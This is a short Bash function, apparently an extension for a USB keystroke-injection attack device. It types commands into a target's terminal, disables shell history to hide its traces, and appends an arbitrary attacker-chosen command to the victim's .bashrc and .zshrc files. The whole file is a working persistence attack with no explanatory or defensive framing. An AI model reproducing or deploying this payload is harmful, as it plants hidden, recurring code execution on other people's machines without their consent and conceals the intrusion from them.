#!/bin/bash

# SHELL_TRIGGER v1 by @drapl0n
# SHELL_TRIGGER triggers commands/scripts on shell execution on target's system OR triggers commands/scripts when target executes terminal emulator.
# Usage: SHELL_TRIGGER <COMMAND/SCRIPT>
function SHELL_TRIGGER(){
	LED ATTACK
	Q DELAY 1000
	Q CTRL-ALT t
	Q DELAY 1000
	Q STRING unset HISTFILE
	Q ENTER
	Q DELAY 200
	Q STRING echo -e "\"ls -a ~/ | grep 'zshrc' &> /dev/null\\\nif [ \\\$? = 0 ]; then\\\n\\\techo \\\"$1\\\" >> ~/.zshrc\\\nfi\\\n\\\nls -a ~/ | grep 'bashrc' &> /dev/null\\\nif [ \\\$? = 0 ]; then\\\n\\\techo \\\"$1\\\" >> ~/.bashrc\\\nfi"\" \> /tmp/sys
	Q ENTER
	Q DELAY 200
	Q STRING chmod +x /tmp/sys
	Q ENTER
	Q DELAY 200
	Q STRING /tmp/./sys
	Q ENTER
} 
export -f SHELL_TRIGGER $1
